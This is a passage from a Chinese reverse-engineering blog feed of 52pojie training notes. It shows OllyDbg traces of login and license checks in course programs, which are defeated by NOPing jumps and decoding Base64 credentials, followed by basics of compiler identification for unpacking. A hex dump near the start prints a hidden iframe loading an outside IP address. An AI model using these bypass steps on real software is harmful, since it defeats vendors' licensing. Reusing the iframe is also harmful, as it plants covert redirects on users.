6C 3E 0D 0A  ....?..&lt;html&gt;..</span><br><span class="line">00177D00  3C 68 65 61 64 3E 0D 0A 3C 73 63 72 69 70 74 20  &lt;head&gt;..&lt;script</span><br><span class="line">00177D10  6C 61 6E 67 75 61 67 65 3D 22 6A 61 76 61 73 63  language=&quot;javasc</span><br><span class="line">00177D20  72 69 70 74 22 3E 73 65 74 54 69 6D 65 6F 75 74  ript&quot;&gt;setTimeout</span><br><span class="line">00177D30  28 22 6C 6F 63 61 74 69 6F 6E 2E 72 65 70 6C 61  (&quot;location.repla</span><br><span class="line">00177D40  63 65 28 6C 6F 63 61 74 69 6F 6E 2E 68 72 65 66  ce(location.href</span><br><span class="line">00177D50  2E 73 70 6C 69 74 28 5C 22 23 5C 22 29 5B 30 5D  .split(\&quot;#\&quot;)[0]</span><br><span class="line">00177D60  29 22 2C 31 30 30 30 29 3B 3C 2F 73 63 72 69 70  )&quot;,1000);&lt;/scrip</span><br><span class="line">00177D70  74 3E 0D 0A 3C 2F 68 65 61 64 3E 0D 0A 3C 69 66  t&gt;..&lt;/head&gt;..&lt;if</span><br><span class="line">00177D80  72 61 6D 65 20 73 72 63 3D 22 68 74 74 70 3A 2F  rame src=&quot;http:/</span><br><span class="line">00177D90  2F 32 32 32 2E 32 30 31 2E 35 34 2E 36 34 3A 38  /222.201.54.64:8</span><br><span class="line">00177DA0  39 2F 66 6C 61 73 68 72 65 64 69 72 2E 68 74 6D  9/flashredir.htm</span><br><span class="line">00177DB0  6C 22 20 66 72 61 6D 65 62 6F 72 64 65 72 3D 30  l&quot; frameborder=0</span><br><span class="line">00177DC0  3E 3C 2F 69 66 72 61 6D 65 3E 0D 0A 3C 2F 68 74  &gt;&lt;/iframe&gt;..&lt;/ht</span><br><span class="line">00177DD0  6D 6C 3E 0D 0A 0D 0A 68 1D 00 1E 00 31 01 08 00  ml&gt;....h..1.</span><br><span class="line">00177DE0  3C 68 74 6D 6C 3E 0D 0A 3C 68 65 61 64 3E 0D 0A  &lt;html&gt;..&lt;head&gt;..</span><br><span class="line">00177DF0  3C 73 63 72 69 70 74 20 6C 61 6E 67 75 61 67 65  &lt;script language</span><br><span class="line">00177E00  3D 22 6A 61 76 61 73 63 72 69 70 74 22 3E 73 65  =&quot;javascript&quot;&gt;se</span><br><span class="line">00177E10  74 54 69 6D 65 6F 75 74 28 22 6C 6F 63 61 74 69  tTimeout(&quot;locati</span><br><span class="line">00177E20  6F 6E 2E 72 65 70 6C 61 63 65 28 6C 6F 63 61 74  on.replace(locat</span><br><span class="line">00177E30  69 6F 6E 2E 68 72 65 66 2E 73 70 6C 69 74 28 5C  ion.href.split(\</span><br><span class="line">00177E40  22 23 5C 22 29 5B 30 5D 29 22 2C 31 30 30 30 29  &quot;#\&quot;)[0])&quot;,1000)</span><br><span class="line">00177E50  3B 3C 2F 73 63 72 69 70 74 3E 0D 0A 3C 2F 68 65  ;&lt;/script&gt;..&lt;/he</span><br><span class="line">00177E60  61 64 3E 0D 0A 3C 69 66 72 61 6D 65 20 73 72 63  ad&gt;..&lt;iframe src</span><br><span class="line">00177E70  3D 22 68 74 74 70 3A 2F 2F 32 32 32 2E 32 30 31  =&quot;http://222.201</span><br><span class="line">00177E80  2E 35 34 2E 36 34 3A 38 39 2F 66 6C 61 73 68 72  .54.64:89/flashr</span><br><span class="line">00177E90  65 64 69 72 2E 68 74 6D 6C 22 20 66 72 61 6D 65  edir.html&quot; frame</span><br><span class="line">00177EA0  62 6F 72 64 65 72 3D 30 3E 3C 2F 69 66 72 61 6D  border=0&gt;&lt;/ifram</span><br><span class="line">00177EB0  65 3E 0D 0A 3C 2F 68 74 6D 6C 3E 0D 0A 0D 0A 00  e&gt;..&lt;/html&gt;.....</span><br></pre></td></tr></table></figure><p>再往下滑看到正文的一些字符串，应该是提取这些字符串之间的字符串，存进内存里。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00401E97  |.  68 536C4800   push 课件1_网.00486C53                      ;  &lt;p&gt;^^^</span><br><span class="line">...</span><br><span class="line">(进入第一个大循环)</span><br><span class="line">00401F82  |.  68 5A6C4800   |push 课件1_网.00486C5A                     ;  $$$</span><br><span class="line">...</span><br><span class="line">00402003  |.  68 5E6C4800   |push 课件1_网.00486C5E                     ;  ###</span><br><span class="line">...</span><br><span class="line">00402084  |.  68 626C4800   |push 课件1_网.00486C62                     ;  ***</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(进入第二个大循环)</span><br><span class="line">00402485  |.  50            |push eax</span><br><span class="line">00402486  |.  3BC8          |cmp ecx,eax</span><br><span class="line">00402488  |.  0F8F C7010000 |jg 课件1_网.00402655                       ;  判断输入是否为空</span><br><span class="line">...</span><br><span class="line">004024D9  |.  83C4 10       |add esp,0x10                            ;  输入的用户名</span><br><span class="line">004024DC  |.  8945 BC       |mov [local.17],eax                      ;  存进local.17</span><br></pre></td></tr></table></figure><p>此时发现寄存器窗口的eax也是我们输入的用户名，右键-&gt;数据窗口中跟随。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00169970  61 62 63 00 01 00 00 00 02 00 02 00 3C 01 0A 00  abc......&lt;..</span><br><span class="line">00169980  61 62 63 39 39 00 37 00 02 00 02 00 22 01 0B 00  abc99.7...&quot;.</span><br><span class="line">00169990  61 62 63 31 00 01 15 00 24 00 02 00 20 01 0C 00  abc1..$.. ..</span><br></pre></td></tr></table></figure><p>发现上面是\^\^\^和$$$之间的内容“abc”，下面也是\^\^\^和$$$之间的内容“abc1”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00402512     /0F84 35010000 je 课件1_网.0040264D                        ;  不能跳转</span><br></pre></td></tr></table></figure><p>绕过这个跳转继续往下，到达这里后eax的值为111，是$$$和###之间的内容“111”，并且对应网页，前面的字符串是“abc”。数据窗口这一行的上面也是“abc”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0040255E  |.  E8 5F100000   |call 课件1_网.004035C2</span><br><span class="line">00402563  |.  83C4 10       |add esp,0x10</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00169970  61 62 63 00 01 00 00 00 02 00 02 00 3C 01 0C 00  abc......&lt;..</span><br><span class="line">00169980  31 31 31 00 39 00 37 00 02 00 02 00 22 01 0B 00  111.9.7...&quot;.</span><br><span class="line">00169990  61 62 63 31 00 01 15 00 24 00 02 00 20 01 0C 00  abc1..$.. ..</span><br></pre></td></tr></table></figure><p>继续往下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0040259C     /0F84 AB000000 je 课件1_网.0040264D                        ;  不能跳转</span><br></pre></td></tr></table></figure><p>绕过跳转</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00402630  |.  E8 870F0000   |call 课件1_网.004035BC</span><br></pre></td></tr></table></figure><p>运行到这里时弹窗说登录成功，到期时间无法显示。但可以猜测<code>^^^abc$$$111###30***</code>这一串中的“30”应该是到期时间。所以这一串奇怪的字符其实包含了用户名、密码和到期时间。</p><img src="/posts/a4cc5112/%E7%99%BB%E5%BD%95%E6%88%90%E5%8A%9F.png" class="" title="登录成功"><h2 id="2-2-网页加密"><a href="#2-2-网页加密" class="headerlink" title="2.2 网页加密"></a>2.2 网页加密</h2><p>破解同样是修改两个跳转指令。</p><p>算法分析：与2.1同样操作来到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">004019C0  |.  68 CD9D4800   push 课件2_网.00489DCD                      ;  http://blog.sina.com.cn/s/blog_151e522e60102vzdy.html</span><br></pre></td></tr></table></figure><img src="/posts/a4cc5112/%E7%BD%91%E9%A1%B5%E5%8A%A0%E5%AF%86.png" class="" title="网页加密"><p>这时直接在程序按照分隔符输入字符串是不对的。看到字符串有等号很明显是Base64加密。拿去解码即可得真正的用户名、密码和到期时间。</p><img src="/posts/a4cc5112/base64%E8%A7%A3%E7%A0%81.png" class="" title="base64解码"><p>但我们这个是分析流程，所以还是继续往下看看吧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00401F22  |.  83C4 1C       |add esp,0x1C                            ;  加密后的用户名(第一次循环用户名为空，第二次才显示第一行的用户名)</span><br><span class="line">00401F25  |.  8945 AC       |mov [local.21],eax</span><br><span class="line">00401F28  |.  8D45 AC       |lea eax,[local.21]</span><br><span class="line">00401F2B  |.  50            |push eax</span><br><span class="line">00401F2C  |.  68 08FA4A00   |push 课件2_网.004AFA08</span><br><span class="line">00401F31  |.  8B0424        |mov eax,dword ptr ss:[esp]</span><br><span class="line">00401F34  |.  8B00          |mov eax,dword ptr ds:[eax]</span><br><span class="line">00401F36  |.  8B00          |mov eax,dword ptr ds:[eax]</span><br><span class="line">00401F38  |.  FF50 0C       |call dword ptr ds:[eax+0xC]             ;  base64解密出来的用户名</span><br><span class="line">00401F3B  |.  8945 A8       |mov [local.22],eax</span><br></pre></td></tr></table></figure><p>执行完base64解密的函数后，eax右键-&gt;数据窗口中跟随，就可看到解密出来的“abc”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">001702A8  01 00 00 00 03 00 00 00 61 62 63 00 75 01 08 00  ......abc.u.</span><br></pre></td></tr></table></figure><p>密码和到期时间一样的操作。</p><h2 id="2-3-EXE验证"><a href="#2-3-EXE验证" class="headerlink" title="2.3 EXE验证"></a>2.3 EXE验证</h2><p>爆破：</p><p>开启服务端，再将客户端载入OD，查找敏感字符串或设置按钮事件，找到函数段首下断运行，点击“验证”，程序停在断点处。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">004012EB  |. /0F85 99000000 jnz 课件3_易.0040138A                       ;  不能跳</span><br><span class="line">004012F1  |. |8B5D F8       mov ebx,[local.2]</span><br><span class="line">004012F4  |. |E8 0BFDFFFF   call 课件3_易.00401004</span><br><span class="line">004012F9  |. |B8 01000000   mov eax,0x1</span><br><span class="line">004012FE  |. |3BC1          cmp eax,ecx                              ;  课件3_易.00482C3B</span><br><span class="line">00401300  |. |7C 0D         jl short 课件3_易.0040130F</span><br><span class="line">00401302  |. |68 01000000   push 0x1</span><br><span class="line">00401307  |. |E8 4E030000   call 课件3_易.0040165A</span><br><span class="line">0040130C  |. |83C4 04       add esp,0x4</span><br><span class="line">0040130F  |&gt; |C1E0 02       shl eax,0x2</span><br><span class="line">00401312  |. |03D8          add ebx,eax</span><br><span class="line">00401314  |. |895D F4       mov [local.3],ebx</span><br><span class="line">00401317  |. |8B5D F4       mov ebx,[local.3]</span><br><span class="line">0040131A  |. |FF33          push dword ptr ds:[ebx]</span><br><span class="line">0040131C  |. |68 442C4800   push 课件3_易.00482C44                      ;  到期时间：</span><br><span class="line">00401321  |. |B9 02000000   mov ecx,0x2</span><br><span class="line">00401326  |. |E8 01FEFFFF   call 课件3_易.0040112C</span><br></pre></td></tr></table></figure><p>分析算法：与2.4一样，只是没了加密过程。</p><h2 id="2-4-EXE加密验证"><a href="#2-4-EXE加密验证" class="headerlink" title="2.4 EXE加密验证"></a>2.4 EXE加密验证</h2><p>爆破与2.3一样。</p><p>分析算法：</p><p>开头同2.1，F8一步步跟踪。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00401E6E  |.  E8 ED250000   call 课件4_易.00404460                      ;  获取输入的用户名</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00401EC2  |.  FF50 08       call dword ptr ds:[eax+0x8]              ;  base64加密用户名：YWJj</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00401EE6  |.  E8 75250000   call 课件4_易.00404460                      ;  获取输入的密码</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00401F3A  |.  FF50 08       call dword ptr ds:[eax+0x8]              ;  密码base64加密:MTIz</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00401F68  |.  8945 E0       mov [local.8],eax                        ;  拼接：YWJj|MTIz</span><br></pre></td></tr></table></figure><p>经过<code>retn</code>后F9运行，程序又回到断点处。这次F7进去代码与之前不同。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00401B42  |.  83C4 10       add esp,0x10                             ;  【登录失败】|账号密码错误</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00401B6B  |.  83C4 10       add esp,0x10                             ;  【登录失败】|账号密码错误</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00401C47  |.  68 CD6E4800   push 课件4_易.00486ECD                      ;  【登录成功】</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00401C59  |.  83F8 00       cmp eax,0x0                              ;  登录成功和登录失败相比较</span><br><span class="line">00401C5C      0F85 99000000 jnz 课件4_易.00401CFB                       ;  nop掉</span><br></pre></td></tr></table></figure><h2 id="2-5-EXE加密验证2-0"><a href="#2-5-EXE加密验证2-0" class="headerlink" title="2.5 EXE加密验证2.0"></a>2.5 EXE加密验证2.0</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">004013C4     /0F85 CC020000 jnz 课件5_易.00401696</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0040147F  |. /0F8C D0010000 jl 课件5_易.00401655</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">004014CE  |. /0F8E 99000000 jle 课件5_易.0040156D</span><br></pre></td></tr></table></figure><p>把这三处都nop掉即可。</p><h2 id="2-6-可可-v9-5"><a href="#2-6-可可-v9-5" class="headerlink" title="2.6 可可 v9.5"></a>2.6 可可 v9.5</h2><p>程序无壳，放心食用。调试选项全选，StrongOD勾选忽略某些异常。下易语言按钮事件断点<code>FF 55 FC 5F 5E</code>。运行，输入账号密码，点击登录。取消断点，F7跟进，一路F8，注意堆栈窗口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00405776   .  E8 D9460000   call 第七课作.00409E54                       ;  获取输入的用户名</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">004057C8   .  E8 87460000   call 第七课作.00409E54                       ;  获取输入的密码</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00405992   . /0F84 7F000000 je 第七课作.00405A17                         ;  要跳</span><br><span class="line">00405998   . |8D45 F8       lea eax,dword ptr ss:[ebp-0x8]</span><br><span class="line">0040599B   . |50            push eax</span><br><span class="line">0040599C   . |E8 A4BEFFFF   call 第七课作.00401845                       ;  账号未找到</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00405AB9   . /0F84 FE000000 je 第七课作.00405BBD                         ;  要跳</span><br><span class="line">...</span><br><span class="line">00405B63   .  68 04000080   push 0x80000004</span><br><span class="line">00405B68   .  6A 00         push 0x0</span><br><span class="line">00405B6A   .  68 14C65500   push 第七课作.0055C614                       ;  err</span><br><span class="line">00405B6F   .  68 04000080   push 0x80000004</span><br><span class="line">00405B74   .  6A 00         push 0x0</span><br><span class="line">00405B76   .  68 18C65500   push 第七课作.0055C618                       ;  signdata</span><br><span class="line">00405B7B   .  68 04000080   push 0x80000004</span><br></pre></td></tr></table></figure><p>改变两个跳转后，F8到这，卡住，暂停+运行，程序弹出不断弹出“用户身份未校验”，还弹出了一个“暗桩”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00405F78   .  E8 D13E0000   call 第七课作.00409E4E</span><br></pre></td></tr></table></figure><p>救命啊我不会！！！</p><hr><p>跟进继续F8，到这又回到按钮事件。重载，跟进这个函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">004087E7  |.  E8 8B030000   call 第七课作.00408B77</span><br></pre></td></tr></table></figure><p>发现跟进这个函数里面的<code>408C3F</code>的call指令又回到按钮事件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00408C3F  |.  E8 D2D6FFFF   call 第七课作.00406316   </span><br></pre></td></tr></table></figure><p>跟进这个函数里面的<code>4063FF</code>的call指令又回到按钮事件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">004063FF  |.  E8 0DB3FFFF   call 第七课作.00401711</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">004087CC  |.  6A FF         push -0x1</span><br><span class="line">004087CE  |.  6A 08         push 0x8</span><br><span class="line">004087D0  |.  68 7A6B0116   push 0x16016B7A</span><br><span class="line">004087D5  |.  68 2B010152   push 0x5201012B</span><br><span class="line">004087DA  |.  E8 63160000   call 第七课作.00409E42</span><br><span class="line">004087DF  |.  83C4 18       add esp,0x18</span><br><span class="line">004087E2  |.  68 00000000   push 0x0</span><br><span class="line">004087E7  |.  E8 8B030000   call 第七课作.00408B77                       ;  暗桩call，跟进</span><br><span class="line">004087EC  |.  68 01000000   push 0x1</span><br><span class="line">004087F1  |.  E8 81030000   call 第七课作.00408B77</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;1-基础知识&quot;&gt;&lt;a href=&quot;#1-基础知识&quot; class=&quot;headerlink&quot; title=&quot;1. 基础知识&quot;&gt;&lt;/a&gt;1. 基础知识&lt;/h1&gt;&lt;h2 id=&quot;1-1-协议&quot;&gt;&lt;a href=&quot;#1-1-协议&quot; class=&quot;headerlink&quot; title=&quot;1.1 协议&quot;&gt;&lt;/a&gt;1.1 协议&lt;/h2&gt;&lt;p&gt;网络验证协议分为UDP和TCP协议。&lt;/p&gt;
&lt;p&gt;目前市面上流行的网络验证一半都是TCP协议的。&lt;/p&gt;
&lt;p&gt;采用TCP协议程序发送数据所用API为：send，接收数据所用API为：recv&lt;/p&gt;
&lt;p&gt;采用UDP协议程序发送数据所用API为：WSASend，接收数据所用API为：WSARecv&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="OllyDbg" scheme="http://example.com/tags/OllyDbg/"/>
    
    <category term="吾爱破解培训" scheme="http://example.com/tags/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD/"/>
    
  </entry>
  
  <entry>
    <title>第一课——脱壳基础</title>
    <link href="http://example.com/posts/e2d652c5.html"/>
    <id>http://example.com/posts/e2d652c5.html</id>
    <published>2022-04-05T01:29:28.072Z</published>
    <updated>2022-04-11T05:26:14.459Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-程序是什么语言编译的"><a href="#1-程序是什么语言编译的" class="headerlink" title="1. 程序是什么语言编译的"></a>1. 程序是什么语言编译的</h1><p>从目前国内接触到程序看，比较流行的编译器有：VC系列、易语言、.NET、Delphi，一些曾经用的很多但渐渐少了有：VB、ASM、BC++，还有一些用的比较少的有：AutoIt、PB、QT等，下面提供一些实例，结合实例来看看“入口点代码”、“程序区段”和“加载模块”等特征。</p><span id="more"></span><h2 id="1-1-VC6"><a href="#1-1-VC6" class="headerlink" title="1.1 VC6"></a>1.1 VC6</h2><img src="/posts/e2d652c5/VC6.png" class="" title="VC6"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00401700 &gt;/$  55            push ebp</span><br><span class="line">00401701  |.  8BEC          mov ebp,esp</span><br><span class="line">00401703  |.  6A FF         push -0x1</span><br><span class="line">00401705  |.  68 00254000   push 吾爱破解.00402500</span><br></pre></td></tr></table></figure><p>VC6特点：入口点代码是固定的代码，入口调用的API也是相同的，其中有的push地址不同程序可能会有所不同；区段有四个也是固定的.text、.rdata、.data和.rsrc。</p><h2 id="1-2-VS2008与VS2013"><a href="#1-2-VS2008与VS2013" class="headerlink" title="1.2 VS2008与VS2013"></a>1.2 VS2008与VS2013</h2><img src="/posts/e2d652c5/VS2008.png" class="" title="VS2008"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00B5DDAC &gt; $  E8 EF4E0000   call 吾爱破解.00B62CA0</span><br><span class="line">00B5DDB1   .^ E9 79FEFFFF   jmp 吾爱破解.00B5DC2F</span><br></pre></td></tr></table></figure><img src="/posts/e2d652c5/VS2013.png" class="" title="VS2013"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00B03359 &gt; $  E8 A9520000   call 吾爱破解.00B08607</span><br><span class="line">00B0335E   .^ E9 7FFEFFFF   jmp 吾爱破解.00B031E2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00B08607  /$  55            push ebp</span><br><span class="line">00B08608  |.  8BEC          mov ebp,esp</span><br></pre></td></tr></table></figure><p>VS特点：入口点只有两行代码，一个CALL后直接JMP，第一个CALL进去后调用的API也是相同的；区段相对于VC6多了一个.reloc。</p><h2 id="1-3-易语言"><a href="#1-3-易语言" class="headerlink" title="1.3 易语言"></a>1.3 易语言</h2><p>易语言编译无壳程序分为独立编译和非独立编译。由于易语言<strong>独立编译</strong>是调用VC的链接程序编译的，所以从区段和入口代码特征和VC相同，用exeinfoPE查壳也显示是VC6编译的。而<strong>非独立编译</strong>却显示不知名EXE，可能查壳工具里面没有存易语言非独立编译的特征码吧。</p><img src="/posts/e2d652c5/%E6%98%93%E8%AF%AD%E8%A8%80%E9%9D%9E%E7%8B%AC%E7%AB%8B%E7%BC%96%E8%AF%91.png" class="" title="易语言非独立编译"><img src="/posts/e2d652c5/%E6%98%93%E8%AF%AD%E8%A8%80.png" class="" title="易语言"><p>易语言特点：从程序里找一些call调用，最终都会走到上面位置（文字不太好表达），这个方法可以区分易语言和VC，非独立编译比较容易识别，入口处和<code>E</code>模块都可以找到<code>krnln.fnr</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">00401000 &gt;/$  E8 89000000                                        call 吾爱破解.0040108E</span><br><span class="line">00401005  |.  50                                                 push eax                                 ; /ExitCode = 0x0</span><br><span class="line">00401006  \.  E8 B5010000                                        call &lt;jmp.&amp;KERNEL32.ExitProcess&gt;         ; \ExitProcess</span><br><span class="line">0040100B   .  47 65 74 4E 65 77 53 6F 63 6B 00                   ascii &quot;GetNewSock&quot;,0</span><br><span class="line">00401016   .  45 72 72 6F 72 00                                  ascii &quot;Error&quot;,0</span><br><span class="line">0040101C   .  6B 72 6E 6C 6E 2E 66 6E 65 00                      ascii &quot;krnln.fne&quot;,0</span><br><span class="line">00401026   .  4E 6F 74 20 66 6F 75 6E 64 20 74 68 65 20 6B 65    ascii &quot;Not found the ke&quot;</span><br><span class="line">00401036   .  72 6E 65 6C 20 6C 69 62 72 61 72 79 20 6F 72 20    ascii &quot;rnel library or &quot;</span><br><span class="line">00401046   .  74 68 65 20 6B 65 72 6E 65 6C 20 6C 69 62 72 61    ascii &quot;the kernel libra&quot;</span><br><span class="line">00401056   .  72 79 20 69 73 20 69 6E 76 61 6C 69 64 21 00       ascii &quot;ry is invalid!&quot;,0</span><br><span class="line">00401065   .  6B 72 6E 6C 6E 2E 66 6E 72 00                      ascii &quot;krnln.fnr&quot;,0</span><br><span class="line">0040106F   .  50 61 74 68 00                                     ascii &quot;Path&quot;,0</span><br><span class="line">00401074   .  53 6F 66 74 77 61 72 65 5C 46 6C 79 53 6B 79 5C    ascii &quot;Software\FlySky\&quot;</span><br><span class="line">00401084   .  45 5C 49 6E 73 74 61 6C 6C 00                      ascii &quot;E\Install&quot;,0</span><br><span class="line">0040108E  /$  55                                                 push ebp</span><br><span class="line">0040108F  |.  8BEC                                               mov ebp,esp</span><br><span class="line">00401091  |.  81C4 F0FEFFFF                                      add esp,-0x110</span><br><span class="line">00401097  |.  8D85 FCFEFFFF                                      lea eax,[local.65]</span><br><span class="line">0040109D  |.  50                                                 push eax</span><br><span class="line">0040109E  |.  E8 41010000                                        call 吾爱破解.004011E4</span><br><span class="line">004010A3  |.  68 65104000                                        push 吾爱破解.00401065                       ; /StringToAdd = &quot;krnln.fnr&quot;</span><br><span class="line">004010A8  |.  8D85 FCFEFFFF                                      lea eax,[local.65]                       ; |</span><br><span class="line">004010AE  |.  50                                                 push eax                                 ; |ConcatString = NULL</span><br><span class="line">004010AF  |.  E8 24010000                                        call &lt;jmp.&amp;KERNEL32.lstrcatA&gt;            ; \lstrcatA</span><br></pre></td></tr></table></figure><h2 id="1-4-Delphi"><a href="#1-4-Delphi" class="headerlink" title="1.4 Delphi"></a>1.4 Delphi</h2><img src="/posts/e2d652c5/Delphi.png" class="" title="Delphi"><p>Delphi特点：非常多的call指令，并且<code>push address</code>与<code>retn</code>结合相当于<code>jmp address</code>。比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push 004A52F4</span><br><span class="line">……</span><br><span class="line">retn</span><br><span class="line">;相当于jmp 004A52F4</span><br></pre></td></tr></table></figure><h2 id="1-5-BC"><a href="#1-5-BC" class="headerlink" title="1.5 BC++"></a>1.5 BC++</h2><img src="/posts/e2d652c5/BC++6.png" class="" title="BC++6"><img src="/posts/e2d652c5/BC++2010.png" class="" title="BC++2010"><p>BC++6与BC++2010都差不多，入口处一样的机器码，接下来调用获取句柄的API函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 